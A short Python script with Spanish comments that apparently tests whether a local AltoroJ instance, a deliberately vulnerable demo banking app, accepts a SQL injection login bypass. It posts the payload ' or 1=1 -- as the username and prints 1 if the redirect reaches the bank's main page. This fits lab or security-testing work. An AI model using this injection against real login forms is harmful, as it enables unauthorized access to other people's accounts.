import requests

# Definir la URL del formulario de login
url_login = 'http://localhost:8080/AltoroJ/doLogin'

# Definir los datos del formulario
data = {
    'uid': "' or 1=1 --",
    'passw': "any_password",
    'btnSubmit': "Login"
}

# Realizar la solicitud POST al formulario de login y seguir redirecciones
with requests.Session() as session:
    response = session.post(url_login, data=data, allow_redirects=False)

    # Verificar la URL de destino después de la redirección
    if response.status_code == 302:  # Verificar que sea una redirección
        redirect_url = response.headers['Location']

        if "/AltoroJ/bank/main.jsp" in redirect_url:
            print("1")
        elif "login.jsp" in redirect_url:
            print("0")
        else:
            print("0")
    else:
        print("0")
